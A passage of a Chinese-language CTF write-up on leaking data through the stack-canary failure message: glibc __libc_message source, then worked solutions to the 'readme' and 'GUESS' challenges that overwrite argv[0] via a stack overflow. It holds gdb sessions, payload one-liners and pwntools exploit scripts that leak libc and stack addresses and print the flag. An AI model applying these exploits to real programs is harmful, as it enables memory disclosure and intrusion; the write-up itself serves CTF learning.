<span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> FATAL_PREPARE</span></span><br><span class="line">  FATAL_PREPARE;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Open a descriptor for /dev/tty unless the user explicitly</span></span><br><span class="line"><span class="comment">     requests errors on standard error.  */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *on_2 = __libc_secure_getenv (<span class="string">&quot;LIBC_FATAL_STDERR_&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (on_2 == <span class="literal">NULL</span> || *on_2 == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    fd = STDERR_FILENO;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">str_list</span> *<span class="title">list</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> nlist = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cp = fmt;</span><br><span class="line">  <span class="keyword">while</span> (*cp != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Find the next &quot;%s&quot; or the end of the string.  */</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *next = cp;</span><br><span class="line">      <span class="keyword">while</span> (next[<span class="number">0</span>] != <span class="string">&#x27;%&#x27;</span> || next[<span class="number">1</span>] != <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  next = __strchrnul (next + <span class="number">1</span>, <span class="string">&#x27;%&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (next[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">	    <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Determine what to print.  */</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span> *str;</span><br><span class="line">      <span class="keyword">size_t</span> len;</span><br><span class="line">      <span class="keyword">if</span> (cp[<span class="number">0</span>] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; cp[<span class="number">1</span>] == <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  str = va_arg (ap, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line">	  len = <span class="built_in">strlen</span> (str);</span><br><span class="line">	  cp += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  str = cp;</span><br><span class="line">	  len = next - cp;</span><br><span class="line">	  cp = next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">str_list</span> *<span class="title">newp</span> =</span> alloca (<span class="keyword">sizeof</span> (struct str_list));</span><br><span class="line">      newp-&gt;str = str;</span><br><span class="line">      newp-&gt;len = len;</span><br><span class="line">      newp-&gt;next = <span class="built_in">list</span>;</span><br><span class="line">      <span class="built_in">list</span> = newp;</span><br><span class="line">      ++nlist;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">bool</span> written = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (nlist &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span> =</span> alloca (nlist * <span class="keyword">sizeof</span> (struct iovec));</span><br><span class="line">      <span class="keyword">ssize_t</span> total = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> cnt = nlist - <span class="number">1</span>; cnt &gt;= <span class="number">0</span>; --cnt)</span><br><span class="line">	&#123;</span><br><span class="line">	  iov[cnt].iov_base = (<span class="keyword">char</span> *) <span class="built_in">list</span>-&gt;str;</span><br><span class="line">	  iov[cnt].iov_len = <span class="built_in">list</span>-&gt;len;</span><br><span class="line">	  total += <span class="built_in">list</span>-&gt;len;</span><br><span class="line">	  <span class="built_in">list</span> = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      written = WRITEV_FOR_FATAL (fd, iov, nlist, total);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_abort)</span><br><span class="line">	&#123;</span><br><span class="line">	  total = ((total + <span class="number">1</span> + GLRO(dl_pagesize) - <span class="number">1</span>)</span><br><span class="line">		   &amp; ~(GLRO(dl_pagesize) - <span class="number">1</span>));</span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">abort_msg_s</span> *<span class="title">buf</span> =</span> __mmap (<span class="literal">NULL</span>, total,</span><br><span class="line">					    PROT_READ | PROT_WRITE,</span><br><span class="line">					    MAP_ANON | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (buf != MAP_FAILED))</span><br><span class="line">	    &#123;</span><br><span class="line">	      buf-&gt;size = total;</span><br><span class="line">	      <span class="keyword">char</span> *wp = buf-&gt;msg;</span><br><span class="line">	      <span class="keyword">for</span> (<span class="keyword">int</span> cnt = <span class="number">0</span>; cnt &lt; nlist; ++cnt)</span><br><span class="line">		wp = mempcpy (wp, iov[cnt].iov_base, iov[cnt].iov_len);</span><br><span class="line">	      *wp = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* We have to free the old buffer since the application might</span></span><br><span class="line"><span class="comment">		 catch the SIGABRT signal.  */</span></span><br><span class="line">	      <span class="class"><span class="keyword">struct</span> <span class="title">abort_msg_s</span> *<span class="title">old</span> =</span> atomic_exchange_acq (&amp;__abort_msg,</span><br><span class="line">							     buf);</span><br><span class="line">	      <span class="keyword">if</span> (old != <span class="literal">NULL</span>)</span><br><span class="line">		__munmap (old, old-&gt;size);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>主要由三个函数组成，可以发现该函数调用会输出argv[0]，因此我们可以通过覆盖argv[0]的值来触发报错输出我们需要的东西。而且还需要注意在底层函数fortify_fail中通过看LIBC_FATAL_STDERR是否被定义或是等于0来决定报错信息的输出，如果为前者（null或0），则会被重定向至&#x2F;dev&#x2F;tty处，打远程即只会在远程显示，因此遇到该问题时我们需要定义LIBC_FATAL_STDERR。</p>
<h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><h4 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_4007E0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbx</span><br><span class="line">  int v1; // eax</span><br><span class="line">  __int64 v3; // [rsp+0h] [rbp-128h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+108h] [rbp-20h]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, &quot;Hello!\nWhat&#x27;s your name? &quot;);</span><br><span class="line">  if ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(1);</span><br><span class="line">  v0 = 0LL;</span><br><span class="line">  __printf_chk(1LL, &quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = _IO_getc(stdin);</span><br><span class="line">    if ( v1 == -1 )</span><br><span class="line">      goto LABEL_9;</span><br><span class="line">    if ( v1 == 10 )</span><br><span class="line">      break;</span><br><span class="line">    byte_600D20[v0++] = v1;</span><br><span class="line">    if ( v0 == 32 )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));</span><br><span class="line">LABEL_8:</span><br><span class="line">  puts(&quot;Thank you, bye!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ ./readme.bin </span><br><span class="line">Hello!</span><br><span class="line">What&#x27;s your name? aaa</span><br><span class="line">Nice to meet you, aaa.</span><br><span class="line">Please overwrite the flag: aaa</span><br><span class="line">Thank you, bye!</span><br><span class="line">pwn@pwn-PC:~/Desktop$ checksec readme.bin </span><br><span class="line">[*] &#x27;/home/pwn/Desktop/readme.bin&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<p>程序中存在两次输入，并且可以发现_IO_gets(&amp;v3)处存在明显的栈溢出。尝试找到__libc_argv[0]的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*0x128+&quot;\n&quot;&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: ./readme.bin terminated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*535+&quot;\n&quot;&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: ./readme.bin terminated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*536+&quot;\n&quot;&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***:   terminated</span><br></pre></td></tr></table></figure>



<p>因此offset &#x3D; 536。为了做题的效率，不可能去一个一个尝试，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find /home</span><br><span class="line"></span><br><span class="line">Searching for &#x27;/home&#x27; in: None ranges</span><br><span class="line"></span><br><span class="line">Found 5 results, display max 5 items:</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffec71 (&quot;/home/pwn/Desktop&quot;)</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffec91 (&quot;/home/pwn&quot;)</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffef29 (&quot;/home/pwn/.Xauthority&quot;)</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffefdb (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line"></span><br><span class="line">gdb-peda$ find 0x7fffffffd0c8</span><br><span class="line"></span><br><span class="line">Searching for &#x27;0x7fffffffd0c8&#x27; in: None ranges</span><br><span class="line"></span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line"></span><br><span class="line">   libc : 0x7ffff7dd43b8 --&gt; 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line"></span><br><span class="line">[stack] : 0x7fffffffcde8 --&gt; 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line"></span><br><span class="line">gdb-peda$ distance $rsp 0x7fffffffcde8</span><br><span class="line"></span><br><span class="line">From 0x7fffffffcbd0 to 0x7fffffffcde8: 536 bytes, 134 dwords</span><br><span class="line"></span><br><span class="line">这个计算距离只是特例，最好是按照上一部分例子中的方法来计算，下断点，distance 地址1 地址2.</span><br></pre></td></tr></table></figure>



<p>可以在IDA下发现.data段的变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 byte_600D20     db 33h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line"></span><br><span class="line">.data:0000000000600D21 a2c3Theserverha db &#x27;2C3_TheServerHasTheFlagHere...&#x27;,0</span><br></pre></td></tr></table></figure>



<p>只需要将此变量进行显示即可，于是构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAA.....</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***:   terminated</span><br></pre></td></tr></table></figure>



<p>没有成功，再看代码逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x40083f:    call   0x4006a0 &lt;_IO_getc@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x400844:    cmp    eax,0xffffffff</span><br><span class="line"></span><br><span class="line">   0x400847:    je     0x40089f</span><br><span class="line"></span><br><span class="line">   0x400849:    cmp    eax,0xa</span><br><span class="line"></span><br><span class="line">   0x40084c:    je     0x400860</span><br><span class="line"></span><br><span class="line">   0x40084e:    mov    BYTE PTR [rbx+0x600d20],al</span><br><span class="line"></span><br><span class="line">   0x400854:    add    rbx,0x1</span><br><span class="line"></span><br><span class="line">   0x400858:    cmp    rbx,0x20</span><br><span class="line"></span><br><span class="line">   0x40085c:    jne    0x400838</span><br></pre></td></tr></table></figure>



<p>这是第二次输入的汇编部分，其中执行了mov BYTE PTR [rbx+0x600d20],al(此时rbx &#x3D; 0)，也就是byte_600D20[v0++] &#x3D; v1，这就把byte_600D20变量循环覆盖掉，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&quot;BBBB&quot;&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAA.....</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: BBBB terminated</span><br></pre></td></tr></table></figure>



<p>但是当ELF文件比较小的时候，它的不同区段可能会被多次映射，在ELF内存映射的时候，bss段会被映射两次，也就是说flag有备份，我们可以使用另一处的地址进行输出，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find 32C3</span><br><span class="line"></span><br><span class="line">Searching for &#x27;32C3&#x27; in: None ranges</span><br><span class="line"></span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line"></span><br><span class="line">readme.bin : 0x400d20 (&quot;32C3_TheServerHasTheFlagHere...&quot;)</span><br><span class="line"></span><br><span class="line">readme.bin : 0x600d20 (&quot;32C3_TheServerHasTheFlagHere...&quot;)</span><br></pre></td></tr></table></figure>



<p>此时选择0x400d20进行构造payload即可成功打印出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &#x27;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x400d20)+&quot;\n&quot;&#x27;|./readme.bin</span><br><span class="line"></span><br><span class="line">Hello!</span><br><span class="line"></span><br><span class="line">What&#x27;s your name? Nice to meet you, AAAAAAAA....</span><br><span class="line"></span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line"></span><br><span class="line">*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere... terminated</span><br><span class="line"></span><br><span class="line">段错误</span><br></pre></td></tr></table></figure>



<p>由于题目在远程服务器上，而且LIBC_FATAL_STDERR*&#x3D;0，这个错误提示只会显示在远端，不会返回到我们这端。因此必须设置如下环境变量LIBC_FATAL_STDERR*&#x3D;1，才能实现将标准错误信息通过管道输出到远程shell中。因此，我们还必须设置该参数。那么环境变量在哪？有什么用？在<strong>libc_message函数的源代码可以看到LIBC_FATAL_STDERR_使用读取了环境变量</strong>libc_secure_getenv。如果它没有被设置、或者为空（\x00或NULL），那么stderr被重定向到_PATH_TTY（这通常是&#x2F;dev&#x2F;tty），因此将错误消息不被发送，只在服务器侧可见。位置在高于<strong>libc_argv[0]内存单元，且在</strong>libc_main[0]地址+8之后。</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">env_addr = <span class="number">0x600d20</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x400d20</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./readme&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s your name? &quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&quot;A&quot;</span>*<span class="number">536</span> + p64(flag_addr) +b <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + p64(env_addr))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;LIBC_FATAL_STDERR_=1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuline()</span><br></pre></td></tr></table></figure>

<h4 id="guess"><a href="#guess" class="headerlink" title="guess"></a>guess</h4><p><img src="/img/image-20220914160556587.png" alt="image-20220914160556587"></p>
<p>可以看到该程序在初始化时将flag.txt读进了程序中而且在sub_400a11函数进行了fork，根据fork函数我们可以知道该程序的子进程会跳出循环，而父进程会在该循环中总共fork三次，也就是说我们总共有三次触发stack_chk_fail函数的机会。所以首先我们需要做的就是找到argv[0]与栈的偏移地址。</p>
<p><img src="/img/image-20220914161835025.png" alt="image-20220914161835025"></p>
<p>可以知道输入字符串与argv[0]的相对偏移为0x128，因此我们可以将argv[0]覆盖为puts_got的地址，使其返回puts_plt地址从而得到libc版本。但是获取到版本信息之后怎么泄露栈地址呢，因为我们知道flag寄存在栈中，只有通过泄露栈地址才能通过相对偏移求出flag地址从而覆盖argv[0]，使程序报错输出flag。在这里就有一个小trick，就是环境变量也是存储在栈中，__environ变量存储着环境变量的地址。因此我们可以通过找到该变量的地址来找到环境变量在栈中的地址，从而计算出flag与该环境变量的相对偏移。</p>
<p><img src="/img/image-20220914164014955.png" alt="image-20220914164014955"></p>
<p>可以发现flag存储地址与环境变量的存储地址相差0x168</p>
<p>据此我们可以找到flag在栈中的地址，最后将其覆盖在argv[0]处即可</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,25829)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./GUESS&#x27;</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">r = <span class="keyword">lambda</span> n=<span class="literal">None</span>: io.recv(n)</span><br><span class="line">ra = <span class="keyword">lambda</span> t=tube.forever:io.recvall(t)</span><br><span class="line">ru = <span class="keyword">lambda</span> delim: io.recvuntil(delim)</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline()</span><br><span class="line">ru(<span class="string">&#x27;Please type your guessing flag\n&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span>+p64(puts_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;*** stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_plt=u64(r(<span class="number">7</span>)[<span class="number">1</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_plt)</span><br><span class="line">libc_add=puts_plt-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ=libc_add+libc.dump(<span class="string">&#x27;__environ&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">sal(<span class="string">&#x27;Please type your guessing flag&#x27;</span>,payload)</span><br><span class="line">ru(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">stack_addr = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">flag_addr = stack_addr - <span class="number">0x168</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag_addr=&#x27;</span>,<span class="built_in">hex</span>(flag_addr))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(flag_addr)</span><br><span class="line">sal(<span class="string">&#x27;Please type your guessing flag&#x27;</span>,payload)</span><br><span class="line">ru(<span class="string">&#x27;you have no sense... bye :-)&#x27;</span>)</span><br></pre></td></tr></table></figure>

